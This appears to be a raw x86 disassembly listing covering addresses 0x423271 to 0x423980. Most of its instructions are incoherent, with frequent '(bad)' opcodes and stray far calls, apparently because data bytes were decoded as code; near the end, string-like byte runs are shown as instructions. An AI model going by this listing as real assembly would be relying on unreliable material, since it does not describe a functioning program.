  423271:	jmp    0x42320a
  423273:	outs   dx,BYTE PTR ds:[esi]
  423274:	out    0x3b,al
  423276:	and    edi,DWORD PTR [esi+0x76a88571]
  42327c:	push   es
  42327d:	(bad)  
  42327e:	jle    0x423271
  423280:	stos   DWORD PTR es:[edi],eax
  423281:	pop    ds
  423282:	mov    cl,0x9e
  423284:	push   esi
  423285:	adc    DWORD PTR [ecx+0x6d23eb2a],edi
  42328b:	pop    ebp
  42328c:	or     edx,DWORD PTR [ebx+0x3c]
  42328f:	out    0x67,al
  423291:	sbb    esp,ecx
  423293:	das    
  423294:	iret   
  423295:	pop    es
  423296:	and    BYTE PTR [ecx+ebp*4],ch
  423299:	and    ebx,0x44
  42329c:	lods   al,BYTE PTR ds:[esi]
  42329d:	pop    ebx
  42329e:	lods   eax,DWORD PTR ds:[esi]
  42329f:	jb     0x42330a
  4232a1:	sti    
  4232a2:	fsubr  QWORD PTR [esi+0x5c93318c]
  4232a8:	into   
  4232a9:	loopne 0x42327e
  4232ab:	mov    dh,0xae
  4232ad:	xlat   BYTE PTR ds:[ebx]
  4232ae:	stos   BYTE PTR es:[edi],al
  4232af:	push   esp
  4232b0:	scas   al,BYTE PTR es:[edi]
  4232b1:	dec    edi
  4232b2:	in     al,0x36
  4232b4:	stos   BYTE PTR es:[edi],al
  4232b5:	jo     0x4232e8
  4232b7:	test   al,0xd4
  4232b9:	cmp    eax,0x4d5b41
  4232be:	add    BYTE PTR [eax],al
  4232c0:	add    BYTE PTR [eax],al
  4232c2:	aaa    
  4232c3:	(bad)  
  4232c4:	out    0xc2,eax
  4232c6:	mul    ebx
  4232c8:	aaa    
  4232c9:	cmc    
  4232ca:	xchg   ecx,eax
  4232cb:	call   0x44ed:0x4e8eef4
  4232d2:	(bad)  
  4232d4:	add    DWORD PTR [eax],eax
  4232d6:	arpl   WORD PTR [eax],ax
  4232d8:	add    BYTE PTR [eax],al
  4232da:	or     BYTE PTR [ebp+0x5c5875e4],al
  4232e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232e1:	lahf   
  4232e2:	cs sbb ebp,esp
  4232e5:	call   0x9661:0x62ed265
  4232ec:	ins    DWORD PTR es:[edi],dx
  4232ed:	or     edi,DWORD PTR [ebx]
  4232ef:	jno    0x42333c
  4232f1:	cmp    BYTE PTR [edi],al
  4232f3:	sbb    ebp,esp
  4232f5:	call   0xd916:0x64a9aa29
  4232fc:	pop    ebp
  4232fd:	dec    ebx
  4232fe:	jmp    0x4232d2
  423300:	nop
  423301:	mov    dh,0x31
  423303:	je     0x4232c1
  423305:	hlt    
  423306:	and    DWORD PTR [esi-0x37],edx
  423309:	dec    eax
  42330a:	pop    ss
  42330b:	push   esi
  42330c:	inc    edi
  42330d:	cld    
  42330e:	lods   eax,DWORD PTR ds:[esi]
  42330f:	data16 adc BYTE PTR [ebx+0x53],al
  423313:	mov    ds:0x9dfbda07,al
  423318:	fcmovb st,st(1)
  42331a:	lock inc edi
  42331c:	pop    edi
  42331d:	in     al,0xdf
  42331f:	cmc    
  423320:	test   al,0x3
  423322:	and    eax,0xe3e20d0b
  423327:	and    BYTE PTR [ecx],ah
  423329:	push   ebx
  42332a:	dec    eax
  42332b:	dec    ebp
  42332c:	ins    BYTE PTR es:[edi],dx
  42332d:	inc    edx
  42332e:	and    al,0xcb
  423330:	dec    esi
  423331:	pop    es
  423332:	clc    
  423333:	addr16 cmp eax,0xf829072f
  423339:	xlat   BYTE PTR ds:[ebx]
  42333a:	into   
  42333b:	test   eax,0xb8
  423340:	add    BYTE PTR [eax],al
  423342:	push   ss
  423343:	aad    0xdf
  423345:	out    dx,eax
  423346:	fucomip st,st(7)
  423348:	ss std 
  42334a:	cmp    BYTE PTR [esi+0x7c015f3a],al
  423350:	cmp    ebp,ecx
  423352:	inc    ecx
  423353:	fild   WORD PTR [ecx]
  423355:	add    BYTE PTR [ebx+0x0],ah
  423358:	add    BYTE PTR [eax],al
  42335a:	xchg   DWORD PTR [ecx],edx
  42335c:	mov    dh,0x5
  42335e:	dec    edi
  42335f:	lds    ebp,FWORD PTR [eax+0x1]
  423362:	scas   al,BYTE PTR es:[edi]
  423363:	xchg   BYTE PTR [eax-0x14],dl
  423366:	cld    
  423367:	xchg   ecx,eax
  423368:	pop    esi
  423369:	push   0x39c51cd7
  42336e:	dec    esp
  42336f:	(bad)  
  423370:	sub    eax,0x9a9e8ff0
  423375:	mov    eax,0x8a1e6c14
  42337a:	not    DWORD PTR [edx+edx*4]
  42337d:	pop    ebp
  42337e:	xchg   BYTE PTR [eax],al
  423380:	fiadd  DWORD PTR [ecx]
  423382:	mov    esi,0x7b62364a
  423387:	pop    ebx
  423388:	ins    BYTE PTR es:[edi],dx
  423389:	and    cl,BYTE PTR [esi]
  42338b:	fiadd  DWORD PTR [ecx+edx*1-0xb67bb0d]
  423392:	and    al,0x9
  423394:	dec    ebx
  423395:	cmp    esi,eax
  423397:	mov    al,0x7c
  423399:	addr16 xchg ecx,eax
  42339b:	test   DWORD PTR [esi],eax
  42339d:	xor    BYTE PTR [ecx+0x39],cl
  4233a0:	push   ss
  4233a1:	pushf  
  4233a2:	mov    ch,al
  4233a4:	pop    esp
  4233a5:	jl     0x4233be
  4233a7:	mov    eax,ds:0xfb984d25
  4233ac:	outs   dx,DWORD PTR ds:[esi]
  4233ad:	bound  esi,QWORD PTR [edx-0x1ec48bbc]
  4233b3:	js     0x423393
  4233b5:	inc    edx
  4233b6:	sub    ebp,DWORD PTR [edx]
  4233b8:	jp     0x42342b
  4233ba:	sbb    esi,eax
  4233bc:	daa    
  4233bd:	add    BYTE PTR [eax],al
  4233bf:	add    BYTE PTR [eax],al
  4233c1:	add    BYTE PTR [esi+0x76],ch
  4233c4:	in     al,0xca
  4233c6:	cld    
  4233c7:	fisubr DWORD PTR [esi-0xa]
  4233ca:	sbb    BYTE PTR [edx+0x50919787],dl
  4233d0:	or     edi,DWORD PTR [edi-0x5c]
  4233d3:	fild   WORD PTR [ecx]
  4233d5:	add    BYTE PTR [ebx+0x0],ah
  4233d8:	add    BYTE PTR [eax],al
  4233da:	cmp    BYTE PTR [edi],bl
  4233dc:	inc    edi
  4233dd:	in     eax,0xc4
  4233df:	shr    eax,1
  4233e1:	sahf   
  4233e2:	inc    edi
  4233e3:	outs   dx,DWORD PTR ds:[esi]
  4233e4:	xchg   ebx,eax
  4233e5:	xor    BYTE PTR [esi+0x53465ad],dl
  4233eb:	mov    ds:0xf7438940,al
  4233f0:	out    0xfc,eax
  4233f2:	cmc    
  4233f3:	into   
  4233f4:	add    dh,bl
  4233f6:	aas    
  4233f7:	fwait
  4233f8:	mov    ah,0x12
  4233fa:	sub    eax,edx
  4233fc:	outs   dx,DWORD PTR ds:[esi]
  4233fd:	fidiv  WORD PTR [edx]
  4233ff:	data16 fdiv DWORD PTR [ecx+ecx*8-0x7b]
  423404:	inc    esp
  423405:	inc    ecx
  423406:	and    DWORD PTR [edi],esp
  423408:	test   al,0xd3
  42340a:	dec    ebx
  42340b:	mov    esp,DWORD PTR [edi]
  42340d:	aad    0xfb
  42340f:	push   0xe
  423411:	xchg   edx,eax
  423412:	fist   DWORD PTR [edi+0x40]
  423415:	jns    0x42340b
  423417:	pop    ss
  423418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423419:	adc    BYTE PTR [edi*1+0x6055ec5d],ch
  423420:	stos   BYTE PTR es:[edi],al
  423421:	xchg   ecx,eax
  423422:	aam    0xdd
  423424:	mov    esi,0x6b7a7ba6
  423429:	shl    BYTE PTR [eax-0x1a],cl
  42342c:	daa    
  42342d:	push   es
  42342e:	iret   
  42342f:	call   0x9898:0x351101f2
  423436:	data16 arpl WORD PTR ds:0x93d1319f,sp
  42343d:	add    BYTE PTR [eax],al
  42343f:	add    BYTE PTR [eax],al
  423441:	add    BYTE PTR [edx],bh
  423443:	push   edx
  423444:	les    ecx,FWORD PTR [edi]
  423446:	in     al,dx
  423447:	lahf   
  423448:	sti    
  423449:	ja     0x423441
  42344b:	rcl    DWORD PTR [eax+0x7136dd3],1
  423451:	int    0x7
  423453:	loopne 0x423456
  423455:	add    BYTE PTR [ebx+0x0],ah
  423458:	add    BYTE PTR [eax],al
  42345a:	cwde   
  42345b:	sbb    eax,0xd7f968a7
  423460:	xchg   BYTE PTR [edi+ecx*8-0x13b4a3e7],cl
  423467:	addr16 pushf 
  423469:	(bad)  
  42346a:	push   edx
  42346b:	xchg   esi,eax
  42346c:	push   esp
  42346d:	xor    ecx,DWORD PTR ds:[edi+0x35]
  423471:	ror    edx,0xc
  423474:	cmp    esp,0x2e
  423477:	sub    BYTE PTR [ebx-0x20],al
  42347a:	and    DWORD PTR [ebp-0x6e10ca93],0x2f
  423481:	outs   dx,BYTE PTR ds:[esi]
  423482:	mov    BYTE PTR [edx],al
  423484:	cs cdq 
  423486:	inc    edi
  423487:	ja     0x4234c6
  423489:	or     edx,DWORD PTR ds:[ebx-0x343fdb3]
  423490:	retf   
  423491:	and    ebx,DWORD PTR [eax]
  423493:	jnp    0x423485
  423495:	add    eax,0x5602605a
  42349a:	pop    eax
  42349b:	scas   al,BYTE PTR es:[edi]
  42349c:	mov    al,0x2a
  42349e:	jae    0x42342e
  4234a0:	and    cl,BYTE PTR [ecx+0x363f6f94]
  4234a6:	dec    edi
  4234a7:	jnp    0x4234f8
  4234a9:	(bad)  
  4234aa:	mov    al,ds:0xa9f3fea6
  4234af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234b0:	cmp    al,0xa8
  4234b2:	cmp    eax,0xf2172dea
  4234b7:	xchg   ebx,eax
  4234b8:	jae    0x423510
  4234ba:	cs inc ebx
  4234bc:	inc    esp
  4234bd:	add    BYTE PTR [eax],al
  4234bf:	add    BYTE PTR [eax],al
  4234c1:	add    BYTE PTR [ebx-0x4293427d],dl
  4234c7:	jle    0x42349c
  4234c9:	call   DWORD PTR [eax-0x20]
  4234cc:	cli    
  4234cd:	call   0xe06a:0x319db111
  4234d4:	add    DWORD PTR [eax],eax
  4234d6:	arpl   WORD PTR [eax],ax
  4234d8:	add    BYTE PTR [eax],al
  4234da:	cmp    cl,dh
  4234dc:	ins    DWORD PTR es:[edi],dx
  4234dd:	or     ebx,ebx
  4234df:	push   ebx
  4234e0:	hlt    
  4234e1:	add    eax,0x34c8fce3
  4234e6:	lods   al,BYTE PTR ds:[esi]
  4234e7:	xchg   BYTE PTR [ecx+0x6b],bh
  4234ea:	push   ss
  4234eb:	imul   ebx,DWORD PTR [ecx-0x53],0xb69c2b7f
  4234f2:	sbb    esi,esp
  4234f4:	mov    cl,0x6
  4234f6:	mov    edx,0x69fc7a54
  4234fb:	(bad)  [edx+0x6fd4d36d]
  423501:	jmp    0x42349b
  423503:	icebp  
  423504:	aad    0x6a
  423506:	add    edi,DWORD PTR [esi+0x75]
  423509:	inc    edi
  42350a:	mov    edx,0xcef9224b
  42350f:	shr    BYTE PTR [eax],cl
  423511:	xor    al,0xc3
  423513:	ja     0x42353b
  423515:	fwait
  423516:	in     eax,0xe4
  423518:	stos   DWORD PTR es:[edi],eax
  423519:	retf   
  42351a:	or     eax,0xafcbae19
  42351f:	lods   eax,DWORD PTR ds:[esi]
  423520:	(bad)  
  423521:	cmc    
  423522:	sbb    al,0x80
  423524:	std    
  423525:	sub    al,0xd7
  423527:	(bad)  
  423528:	pop    esi
  423529:	es jl  0x423510
  42352c:	(bad)  
  42352d:	fdivr  DWORD PTR [edx+ebx*4+0x2212aaa4]
  423534:	(bad)  
  423535:	lahf   
  423536:	in     eax,dx
  423537:	(bad)  [ebp-0x26]
  42353a:	jbe    0x4234d4
  42353c:	sti    
  42353d:	add    BYTE PTR [eax],al
  42353f:	add    BYTE PTR [eax],al
  423541:	add    ah,bl
  423543:	fincstp 
  423545:	shl    bh,0xee
  423548:	(bad)  
  423549:	frstor [ecx+eax*1]
  42354c:	pop    ebp
  42354d:	dec    edi
  42354e:	inc    ebx
  42354f:	lods   al,BYTE PTR ds:[esi]
  423550:	out    dx,eax
  423551:	and    ebp,ecx
  423553:	loopne 0x423556
  423555:	add    BYTE PTR [ebx+0x0],ah
  423558:	add    BYTE PTR [eax],al
  42355a:	out    dx,al
  42355b:	push   ebx
  42355c:	push   esi
  42355d:	sub    DWORD PTR [eax-0x3383d0a7],edx
  423563:	scas   al,BYTE PTR es:[edi]
  423564:	or     eax,0xdbb5a363
  423569:	or     BYTE PTR gs:[edi],dh
  42356c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42356d:	stos   BYTE PTR es:[edi],al
  42356e:	jne    0x423505
  423570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423571:	mov    dl,0x4b
  423573:	fsub   QWORD PTR [esi-0x38ae4fa8]
  423579:	loop   0x4234fd
  42357b:	push   0xb454619c
  423580:	mov    bh,0x79
  423582:	rol    bl,1
  423584:	push   cs
  423585:	mov    DWORD PTR [esi],ebp
  423587:	pusha  
  423588:	mov    edi,0xf15829ae
  42358d:	mov    bh,bh
  42358f:	dec    eax
  423590:	mov    al,0x46
  423592:	cmp    DWORD PTR [esi+0x40],esi
  423595:	mov    eax,0x8d46f568
  42359a:	retf   0xc0f4
  42359d:	loopne 0x42352c
  42359f:	inc    ebp
  4235a0:	adc    DWORD PTR [esi],ecx
  4235a2:	bound  ebp,QWORD PTR ds:0x6a6f2c05
  4235a8:	stos   DWORD PTR es:[edi],eax
  4235a9:	addr16 aaa 
  4235ab:	out    dx,al
  4235ac:	scas   al,BYTE PTR es:[edi]
  4235ad:	push   es
  4235ae:	pop    ds
  4235af:	ja     0x4235ba
  4235b1:	jge    0x423540
  4235b3:	call   0x99c4d43b
  4235b8:	jmp    0x42360c
  4235ba:	sub    DWORD PTR [ebp+0x3f],ebx
  4235c0:	add    BYTE PTR [eax],al
  4235c2:	outs   dx,DWORD PTR ds:[esi]
  4235c3:	mov    ds:0x7edd2ad4,al
  4235c8:	jmp    edi
  4235ca:	push   edx
  4235cb:	fcmovu st,st(5)
  4235cd:	in     eax,0xc1
  4235cf:	not    BYTE PTR [ebx-0x5e]
  4235d2:	xor    cl,ah
  4235d4:	add    DWORD PTR [eax],eax
  4235d6:	arpl   WORD PTR [eax],ax
  4235d8:	add    BYTE PTR [eax],al
  4235da:	sahf   
  4235db:	sbb    ebp,DWORD PTR [ebx+0x7c09abd0]
  4235e1:	int3   
  4235e2:	mov    bh,0x1e
  4235e4:	xchg   ebp,eax
  4235e5:	aas    
  4235e6:	pop    ebp
  4235e7:	jl     0x423614
  4235e9:	dec    edx
  4235ea:	aaa    
  4235eb:	add    DWORD PTR [edi-0x27ae2182],esp
  4235f1:	lahf   
  4235f2:	inc    ebx
  4235f3:	mov    esp,0x5b17e058
  4235f8:	jmp    0x4900cb72
  4235fd:	fs out 0xe4,al
  423600:	data16 daa 
  423602:	call   0xedbc:0x7cbdb240
  423609:	mov    cl,0x7a
  42360b:	out    dx,al
  42360c:	sti    
  42360d:	push   ss
  42360e:	inc    ecx
  42360f:	icebp  
  423610:	rol    esp,cl
  423612:	or     al,0x3e
  423614:	pop    ebx
  423615:	fld    TBYTE PTR [ecx]
  423617:	out    dx,eax
  423618:	rcr    BYTE PTR [ecx+0x79c929a2],0xa5
  42361f:	ja     0x423635
  423621:	or     al,0xaf
  423623:	outs   dx,DWORD PTR ds:[esi]
  423624:	mov    DWORD PTR [edi+0x6ec53534],edx
  42362a:	rcl    BYTE PTR [edi+0x10],1
  42362d:	xchg   edx,eax
  42362e:	scas   eax,DWORD PTR es:[edi]
  42362f:	scas   eax,DWORD PTR es:[edi]
  423630:	(bad)  
  423633:	int    0xdc
  423635:	outs   dx,DWORD PTR ds:[esi]
  423636:	inc    DWORD PTR [ecx]
  423638:	out    dx,eax
  423639:	jg     0x4235f6
  42363b:	loop   0x4236a3
  42363d:	add    BYTE PTR [eax],al
  42363f:	add    BYTE PTR [eax],al
  423641:	add    cl,bh
  423643:	sbb    al,al
  423645:	inc    esi
  423646:	jecxz  0x423626
  423648:	(bad)  
  423649:	mov    edi,0xe1f1bc83
  42364e:	add    esi,DWORD PTR [edx-0x68]
  423651:	test   BYTE PTR [ebx+0x630001e1],dl
  423657:	add    BYTE PTR [eax],al
  423659:	add    BYTE PTR [ecx],bh
  42365b:	sub    cl,BYTE PTR [edi]
  42365d:	out    dx,eax
  42365e:	vmovlhps xmm5,xmm0,xmm7
  423662:	xchg   esp,eax
  423663:	call   0xdf40:0xbf313eb1
  42366a:	or     bl,BYTE PTR [esp+esi*2+0xa]
  42366e:	jl     0x423663
  423670:	xchg   ebx,eax
  423671:	out    dx,eax
  423672:	or     al,0x2e
  423674:	and    BYTE PTR [edi],0x23
  423677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423678:	adc    BYTE PTR [ecx],al
  42367a:	push   cs
  42367b:	jne    0x4236da
  42367d:	jmp    0x4236fb
  42367f:	push   esi
  423680:	jno    0x42366d
  423682:	pop    eax
  423683:	xchg   edi,eax
  423684:	cdq    
  423685:	add    eax,0x8c15c76
  42368a:	adc    eax,ebx
  42368c:	xchg   ebx,eax
  42368d:	pushf  
  42368e:	js     0x4236b0
  423690:	pop    es
  423691:	mov    ds:0x2e5fb7e,eax
  423696:	pop    ebp
  423697:	xor    BYTE PTR [ecx-0x32],ch
  42369a:	fistp  WORD PTR [eax+0x73]
  42369d:	test   esp,ecx
  42369f:	ds lahf 
  4236a1:	mov    al,0x64
  4236a3:	or     DWORD PTR [edx],esi
  4236a5:	dec    edx
  4236a6:	outs   dx,DWORD PTR ds:[esi]
  4236a7:	ss dec eax
  4236a9:	aam    0x6
  4236ab:	sti    
  4236ac:	adc    DWORD PTR [eax],0xcfbd936b
  4236b2:	mov    ecx,0x7c96b8bb
  4236b7:	mov    cl,0xb8
  4236b9:	cmc    
  4236ba:	cwde   
  4236bb:	jle    0x423678
  4236bd:	add    BYTE PTR [eax],al
  4236bf:	add    BYTE PTR [eax],al
  4236c1:	add    BYTE PTR [ecx+0x3e8336b9],ah
  4236c7:	(bad)  
  4236c8:	mov    ch,0xbb
  4236ca:	icebp  
  4236cb:	and    eax,0x3cae8c27
  4236d0:	aad    0x4d
  4236d2:	mul    cl
  4236d4:	add    DWORD PTR [eax],eax
  4236d6:	arpl   WORD PTR [eax],ax
  4236d8:	add    BYTE PTR [eax],al
  4236da:	pushf  
  4236db:	inc    edi
  4236dc:	mov    esp,ebp
  4236de:	aas    
  4236df:	retf   
  4236e0:	sub    ecx,DWORD PTR [edi+0x110166bb]
  4236e6:	jae    0x42375d
  4236e8:	adc    al,0x5
  4236ea:	mov    edx,0xcbea355a
  4236ef:	or     eax,0xcf91eea
  4236f4:	cmc    
  4236f5:	adc    eax,0xd94ba8d7
  4236fa:	push   esp
  4236fb:	repz xchg ecx,eax
  4236fd:	add    BYTE PTR [edi-0x49],0xdc
  423701:	mov    ebx,0xf0833b14
  423706:	in     al,dx
  423707:	push   0x35
  423709:	xor    DWORD PTR [eax],eax
  42370b:	adc    DWORD PTR ds:0xfdc77443,0x3dabc323
  423715:	mov    al,BYTE PTR [ebx]
  423717:	push   0x766fc64a
  42371c:	call   0xf47e0a2b
  423721:	sub    al,0x20
  423723:	cmp    eax,0x41cb7bd4
  423728:	mov    bl,0xb2
  42372a:	lods   eax,DWORD PTR ds:[esi]
  42372b:	sar    BYTE PTR [esi+0x867b7c4],cl
  423731:	and    eax,0x2a406dd6
  423736:	sub    al,0x52
  423738:	(bad)  
  42373a:	lds    ebp,FWORD PTR [ecx+0xd5]
  423740:	add    BYTE PTR [eax],al
  423742:	adc    dl,bh
  423744:	repz or esi,edi
  423747:	das    
  423748:	cli    
  423749:	fist   WORD PTR [ecx]
  42374b:	dec    ebx
  42374c:	es nop
  42374e:	jmp    0x4237c3
  423750:	cmp    ah,dh
  423752:	pop    ecx
  423753:	loop   0x423756
  423755:	add    BYTE PTR [ebx+0x0],ah
  423758:	add    BYTE PTR [eax],al
  42375a:	pop    ebx
  42375b:	mov    ebp,DWORD PTR [ecx]
  42375d:	jmp    0x7887:0x83f9ad1e
  423764:	xor    bh,BYTE PTR [esi+0x62]
  423767:	cmc    
  423768:	leave  
  423769:	push   edx
  42376a:	and    eax,0x7c70bf76
  42376f:	jmp    0xe2a:0x95018172
  423776:	pusha  
  423777:	test   al,0x35
  423779:	push   esp
  42377a:	sbb    eax,0x3012c9a1
  42377f:	(bad)  
  423780:	clc    
  423781:	mov    esp,0x83ee9f0f
  423786:	ror    BYTE PTR [ebx-0x76d32864],1
  42378c:	scas   al,BYTE PTR es:[edi]
  42378d:	cmc    
  42378e:	jecxz  0x4237c5
  423790:	xchg   ecx,eax
  423792:	(bad)  
  423794:	inc    ebp
  423795:	dec    esp
  423796:	in     eax,0x93
  423798:	std    
  423799:	gs hlt 
  42379b:	test   eax,0x66617745
  4237a0:	lds    eax,FWORD PTR [edi+0x367f470f]
  4237a6:	mov    bl,BYTE PTR [esi-0x41c3e6b6]
  4237ac:	sub    al,0x16
  4237ae:	fdiv   DWORD PTR [eax]
  4237b0:	popa   
  4237b1:	lock loopne 0x42373d
  4237b4:	(bad)  
  4237b5:	ret    0x1661
  4237b8:	dec    ecx
  4237b9:	sbb    BYTE PTR [esi],ah
  4237bb:	inc    eax
  4237bc:	add    BYTE PTR [bx+si],al
  4237bf:	add    BYTE PTR [eax],al
  4237c1:	add    BYTE PTR [eax],al
  4237c3:	rol    BYTE PTR [edx+0x0],0x4
  4237c7:	rol    BYTE PTR [edx+0x0],0x8
  4237cb:	rol    BYTE PTR [edx+0x0],0xc
  4237cf:	rol    BYTE PTR [edx+0x0],0x10
  4237d3:	rol    BYTE PTR [edx+0x0],0x14
  4237d7:	rol    BYTE PTR [edx+0x0],0x18
  4237db:	rol    BYTE PTR [edx+0x0],0x1c
  4237df:	rol    BYTE PTR [edx+0x0],0x57
  4237e3:	inc    edi
  4237e4:	cmp    DWORD PTR [edi+0x41],ebx
  4237e7:	pop    eax
  4237e8:	ss push esi
  4237ea:	pop    edi
  4237eb:	cmp    BYTE PTR [eax],al
  4237ed:	inc    ebx
  4237ee:	inc    ebp
  4237ef:	dec    esp
  4237f0:	pop    edi
  4237f1:	pop    eax
  4237f2:	push   edi
  4237f3:	dec    eax
  4237f4:	inc    edx
  4237f5:	add    BYTE PTR [edi+0x50],dl
  4237f8:	xor    eax,0x4641365f
  4237fd:	cmp    DWORD PTR [edx],esi
  4237ff:	xor    ebx,DWORD PTR [edi+0x32]
  423802:	aaa    
  423803:	add    BYTE PTR [eax+0x48],dl
  423806:	xor    BYTE PTR [edi+0x58],bl
  423809:	push   esp
  42380a:	inc    ecx
  42380b:	dec    ebp
  42380c:	push   ecx
  42380d:	pop    edi
  42380e:	inc    esi
  42380f:	push   ebp
  423810:	cmp    DWORD PTR [eax],eax
  423812:	push   edi
  423813:	push   ebp
  423814:	inc    ecx
  423815:	xor    dh,BYTE PTR [ebx]
  423817:	xor    ebx,DWORD PTR [edi+0x4e]
  42381a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42381e:	cmp    DWORD PTR [edi+0x38],ebx
  423821:	dec    ecx
  423822:	cmp    DWORD PTR [edx+0x36],ebx
  423825:	pop    edi
  423826:	dec    edx
  423827:	xor    BYTE PTR [edx+0x34],cl
  42382a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42382e:	xor    esi,DWORD PTR [eax]
  423830:	pop    edi
  423831:	inc    edx
  423832:	dec    ebx
  423833:	pop    eax
  423834:	pop    eax
  423835:	xor    eax,0x51414d00
  42383a:	pop    edi
  42383b:	inc    ecx
  42383c:	xor    al,BYTE PTR [ebp+0x5f]
  42383f:	inc    ecx
  423840:	dec    ebx
  423841:	cmp    DWORD PTR ds:0x5a003939,esi
  423847:	inc    ebp
  423848:	cmp    BYTE PTR [edi+0x4d],bl
  42384b:	ss dec eax
  42384d:	dec    ebx
  42384e:	add    BYTE PTR [ebp+0x57],al
  423851:	xor    DWORD PTR [edi+0x31],ebx
  423854:	dec    ebx
  423855:	xor    eax,DWORD PTR [ecx+0x30]
  423858:	push   ebx
  423859:	add    BYTE PTR [edx+esi*1+0x36],al
  42385d:	aaa    
  42385e:	pop    edi
  42385f:	push   edx
  423860:	dec    eax
  423861:	dec    ebp
  423862:	cmp    BYTE PTR [edi+0x37],bl
  423865:	inc    esi
  423866:	xor    eax,0x43355500
  42386b:	pop    edi
  42386c:	pop    ecx
  42386d:	dec    ecx
  42386e:	push   ebx
  42386f:	xor    bl,BYTE PTR [edi+0x52]
  423872:	add    BYTE PTR [eax+0x55],dl
  423875:	dec    ecx
  423876:	xor    BYTE PTR [edi+0x43],bl
  423879:	ss inc ebp
  42387b:	xor    bl,BYTE PTR [edi+0x4d]
  42387e:	xor    al,0x4a
  423880:	push   edx
  423881:	push   ebp
  423882:	add    BYTE PTR [esi+0x39],cl
  423885:	push   eax
  423886:	pop    edi
  423887:	push   ebp
  423888:	cmp    DWORD PTR [esi],esi
  42388a:	xor    BYTE PTR [ecx],dh
  42388c:	pop    edi
  42388d:	dec    edi
  42388e:	dec    esi
  42388f:	push   esp
  423890:	cmp    BYTE PTR [eax],al
  423892:	dec    esp
  423893:	xor    al,0x44
  423895:	xor    DWORD PTR [edi+0x4b],ebx
  423898:	xor    DWORD PTR [ebp+0x5f],eax
  42389b:	pop    edx
  42389c:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238a0:	pop    edi
  4238a1:	inc    edx
  4238a2:	xor    dh,BYTE PTR [ecx]
  4238a4:	push   ebx
  4238a5:	xor    DWORD PTR [ecx],edi
  4238a7:	inc    edx
  4238a8:	add    BYTE PTR [edi+0x45],al
  4238ab:	xor    al,0x38
  4238ad:	xor    BYTE PTR [eax],dh
  4238af:	pop    edi
  4238b0:	dec    edx
  4238b1:	dec    ebx
  4238b2:	xor    eax,0x33345f4d
  4238b7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238bb:	pop    edi
  4238bc:	aaa    
  4238bd:	push   esi
  4238be:	dec    ebx
  4238bf:	push   edx
  4238c0:	pop    edi
  4238c1:	inc    ebx
  4238c2:	add    BYTE PTR [edx+0x35],bl
  4238c5:	dec    ebp
  4238c6:	pop    edi
  4238c7:	inc    edi
  4238c8:	dec    esi
  4238c9:	xor    al,0x49
  4238cb:	xor    eax,0x54590035
  4238d0:	push   edx
  4238d1:	pop    edi
  4238d2:	push   esp
  4238d3:	inc    ebx
  4238d4:	inc    ecx
  4238d5:	pop    edi
  4238d6:	cmp    DWORD PTR [ecx+0x41],ebx
  4238d9:	push   ebp
  4238da:	pop    edi
  4238db:	push   ebp
  4238dc:	inc    ebp
  4238dd:	add    BYTE PTR [esi+esi*1+0x35],cl
  4238e1:	pop    edi
  4238e2:	pop    eax
  4238e3:	dec    edx
  4238e4:	inc    edx
  4238e5:	inc    edi
  4238e6:	add    BYTE PTR [edx+0x36],al
  4238e9:	inc    ebx
  4238ea:	pop    edi
  4238eb:	xor    BYTE PTR ds:0x36464b,dh
  4238f1:	dec    ebx
  4238f2:	cmp    DWORD PTR [esi+0x37],eax
  4238f5:	xor    ebx,DWORD PTR [edi+0x35]
  4238f8:	ss inc edi
  4238fa:	pop    ecx
  4238fb:	dec    eax
  4238fc:	pop    ecx
  4238fd:	add    BYTE PTR [ebp+0x35],cl
  423900:	push   eax
  423901:	xor    BYTE PTR [edi+0x4f],bl
  423904:	pop    ecx
  423905:	xor    cl,BYTE PTR [edi+0x0]
  423908:	pop    ecx
  423909:	xor    DWORD PTR [esi+0x5f],ecx
  42390c:	xor    al,BYTE PTR [edx+0x30]
  42390f:	push   esi
  423910:	push   esp
  423911:	inc    ebp
  423912:	add    BYTE PTR [edi+0x37],al
  423915:	push   esi
  423916:	xor    DWORD PTR [edi+0x49],ebx
  423919:	xor    al,BYTE PTR [esi+0x30]
  42391c:	pop    edi
  42391d:	ss dec esi
  42391f:	cmp    BYTE PTR [eax],al
  423921:	pop    edx
  423922:	xor    eax,0x445f334b
  423927:	xor    BYTE PTR [eax],bh
  423929:	push   ecx
  42392a:	push   esi
  42392b:	xor    al,0x0
  42392d:	push   ebp
  42392e:	pop    eax
  42392f:	inc    edi
  423930:	xor    DWORD PTR [edi+0x39],ebx
  423933:	push   esp
  423934:	inc    ebx
  423935:	aaa    
  423936:	inc    esp
  423937:	add    BYTE PTR [edi+0x39],dl
  42393a:	ss pop edi
  42393c:	dec    eax
  42393d:	pop    edx
  42393e:	pop    ecx
  42393f:	inc    edi
  423940:	push   ebp
  423941:	pop    edi
  423942:	push   eax
  423943:	dec    eax
  423944:	inc    ebx
  423945:	add    BYTE PTR [ebp+0x0],dl
  423948:	xor    al,0x0
  42394a:	dec    edi
  42394b:	add    BYTE PTR [edi+0x0],bl
  42394e:	cmp    BYTE PTR [eax],al
  423950:	xor    al,BYTE PTR [eax]
  423952:	inc    ebx
  423953:	add    BYTE PTR [edx+0x0],bl
  423956:	inc    ebx
  423957:	add    BYTE PTR [edi],dh
  423959:	add    BYTE PTR [edi+0x0],bl
  42395c:	inc    ebx
  42395d:	add    BYTE PTR [eax+eax*1+0x0],al
  423961:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423965:	add    BYTE PTR [edx],dh
  423967:	add    BYTE PTR [edi+0x0],bl
  42396a:	cmp    BYTE PTR [eax],al
  42396c:	dec    esp
  42396d:	add    BYTE PTR [esi+0x0],dl
  423970:	pop    edi
  423971:	add    BYTE PTR [ecx+0x0],bl
  423974:	push   edx
  423975:	add    BYTE PTR [esi+0x0],dl
  423978:	xor    al,BYTE PTR [eax]
  42397a:	cmp    BYTE PTR [eax],al
  42397c:	pop    edi
  42397d:	add    BYTE PTR [edx+0x0],cl
  423980:	add    BYTE PTR [eax],al
